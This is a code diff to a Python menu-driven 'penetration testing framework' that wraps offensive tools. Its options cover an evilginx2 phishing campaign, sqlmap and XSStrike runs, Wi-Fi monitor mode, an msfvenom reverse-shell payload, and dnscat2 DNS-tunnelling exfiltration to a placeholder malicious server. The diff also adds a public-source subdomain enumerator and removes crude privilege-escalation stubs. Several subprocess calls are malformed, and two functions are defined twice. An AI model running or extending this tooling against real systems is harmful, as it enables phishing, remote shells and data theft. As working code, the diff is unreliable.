@@ -2,6 +2,9 @@ import os
 import subprocess
 import time
 import sys
+import asyncio
+import aiohttp
+import json
 
 # Define tool checks
 def check_tool(tool_name):
@@ -45,21 +48,37 @@ def display_splash_screen():
     print(splash)
     print("PT Framework 41PH4-01\n")
 
+# Define tool checks
+def check_tool(tool_name):
+    """Check if the tool is installed on the system."""
+    try:
+        subprocess.run([tool_name, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return True
+    except FileNotFoundError:
+        return False
+
+# Banner for the framework
+def display_splash_screen():
+    splash = """
+    [Your splash screen here]
+    """
+    print(splash)
+    print("PT Framework 41PH4-01\n")
+
 # Tools and their commands
 TOOLS = {
-    'sqlmap': 'sqlmap --help',  # SQL Injection Automation
-    'xsstrike': 'xsstrike --help',  # XSS Scanner
-    'aircrack-ng': 'airmon-ng --help',  # Wi-Fi Deauth, Cracking
-    'metasploit': 'msfvenom --help',  # Metasploit Payload Generation
-    'evilginx2': 'evilginx2 --help',  # Advanced Phishing (session hijacking)
-    'nmap': 'nmap -v',  # Network Scanning
-    'nessus': 'nessus -h',  # Vulnerability Scanning
-    'amass': 'amass -h',  # Subdomain Enumeration
-    'dnscat2': 'dnscat2 --help',  # DNS Tunneling for Exfiltration
+    'sqlmap': 'sqlmap --help',
+    'xsstrike': 'xsstrike --help',
+    'aircrack-ng': 'airmon-ng --help',
+    'metasploit': 'msfvenom --help',
+    'evilginx2': 'evilginx2 --help',
+    'nmap': 'nmap -v',
+    'nessus': 'nessus -h',
+    'dnscat2': 'dnscat2 --help',
 }
 
 # Global settings
-TARGET = None  # Placeholder for target URL or IP
+TARGET = None
 USER_AGENT = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
 
 # Tool checking function
@@ -73,17 +92,17 @@ def check_tools():
     else:
         print("All tools are installed and ready!")
 
-# Phishing Campaign: Define fake login pages and email sending
+# Phishing Campaign with Evilginx2
 def phishing_campaign():
     print("[*] Starting Phishing Campaign with Evilginx2...")
     subprocess.run(["evilginx2", "launch"])
 
-# SQL Injection Automation: Using sqlmap
+# SQL Injection with sqlmap
 def sql_injection(url):
     print(f"[*] Running SQL Injection Test on {url}")
     subprocess.run([TOOLS['sqlmap'], f"-u {url} --batch"])
 
-# XSS Testing: Using XSStrike
+# XSS Testing with XSStrike
 def test_xss(url):
     print(f"[*] Running XSS Testing on {url}")
     subprocess.run([TOOLS['xsstrike'], f"-u {url} --batch"])
@@ -93,42 +112,64 @@ def network_scan(target):
     print(f"[*] Running Network Scan on {target}")
     subprocess.run([TOOLS['nmap'], target])
 
-# Automating Wi-Fi Attacks with aircrack-ng
+# Wi-Fi Deauth Attack with aircrack-ng
 def wifi_attack(interface):
     print(f"[*] Setting {interface} to monitor mode for Wi-Fi attacks...")
     subprocess.run(["airmon-ng", "start", interface])
     subprocess.run(["airodump-ng", interface])
 
-# Metasploit Payload Creation (Reverse Shell)
+# Metasploit Payload Generation
 def metasploit_payload():
     print("[*] Generating Metasploit payload...")
     subprocess.run([TOOLS['metasploit'], "-p linux/x86/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f elf > shell.elf"])
 
-# Subdomain Enumeration with Amass
-def subdomain_enum(domain):
-    print(f"[*] Enumerating subdomains for {domain}")
-    subprocess.run([TOOLS['amass'], "enum", "-d", domain])
+# Subdomain Enumeration using custom script
+async def fetch(session, url):
+    """Fetch data from a URL."""
+    async with session.get(url) as response:
+        return await response.text()
 
-# Data Exfiltration with DNS Tunneling (dnscat2 or iodine)
+async def get_subdomains(domain):
+    """Get subdomains from public sources."""
+    subdomains = set()
+    urls = [
+        f"https://crt.sh/?q={domain}&output=json",
+        f"https://api.hackertarget.com/hostsearch/?q={domain}"
+    ]
+
+    async with aiohttp.ClientSession() as session:
+        tasks = [fetch(session, url) for url in urls]
+        responses = await asyncio.gather(*tasks)
+
+        for response in responses:
+            if response.startswith('['):  # JSON response from crt.sh
+                json_response = json.loads(response)
+                for item in json_response:
+                    subdomains.add(item['name_value'])
+            else:  # Plain text response from hackertarget
+                lines = response.split('\n')
+                for line in lines:
+                    if line:
+                        subdomains.add(line.split(',')[0])
+
+    return list(subdomains)
+
+def subdomain_enum(domain):
+    """Wrapper to call the async function."""
+    print(f"[*] Enumerating subdomains for {domain}...")
+    subdomains = asyncio.run(get_subdomains(domain))
+    print(f"Found subdomains: {subdomains}")
+
+# Data Exfiltration with DNS Tunneling (dnscat2)
 def dns_tunneling():
     print("[*] Starting DNS Tunneling for Data Exfiltration...")
     subprocess.run([TOOLS['dnscat2'], "--dns", "your_malicious_server"])
 
-# Privilege Escalation for Linux (example with basic local privilege escalation)
-def linux_priv_escalation():
-    print("[*] Attempting Linux Privilege Escalation...")
-    subprocess.run(["sudo", "python3", "-c", "import os; os.system('/bin/bash')"])
-
-# Privilege Escalation for Windows (example with basic Windows privilege escalation)
-def windows_priv_escalation():
-    print("[*] Attempting Windows Privilege Escalation...")
-    subprocess.run(["powershell", "Start-Process cmd.exe -Verb runAs"])
-
 # Main driver function for the framework
 def main():
-    print_banner()  # Display the banner
-    check_tools()  # Check if all tools are available
-    
+    display_splash_screen()
+    check_tools()
+
     print("[*] Welcome to the Complete Penetration Testing Framework!")
     print("[*] Please choose an option:")
     print("1. Phishing Campaign")
@@ -139,10 +180,6 @@ def main():
     print("6. Generate Metasploit Payload")
     print("7. Subdomain Enumeration")
     print("8. DNS Tunneling Exfiltration")
-    print("9. Linux Privilege Escalation")
-    print("10. Windows Privilege Escalation")
-    print("11. Automated Recon & Information Gathering")
-    print("12. Vulnerability Scanning (Nessus or OpenVAS)")
 
     choice = input("Enter your choice: ")
 
@@ -167,17 +204,6 @@ def main():
         subdomain_enum(domain)
     elif choice == "8":
         dns_tunneling()
-    elif choice == "9":
-        linux_priv_escalation()
-    elif choice == "10":
-        windows_priv_escalation()
-    elif choice == "11":
-        target_ip = input("Enter target IP for recon (subdomains, ports, services): ")
-        network_scan(target_ip)
-        subdomain_enum(target_ip)
-    elif choice == "12":
-        target_ip = input("Enter target IP for vulnerability scanning: ")
-        subprocess.run([TOOLS['nessus'], "-v", target_ip])
     else:
         print("[!] Invalid choice!")
 
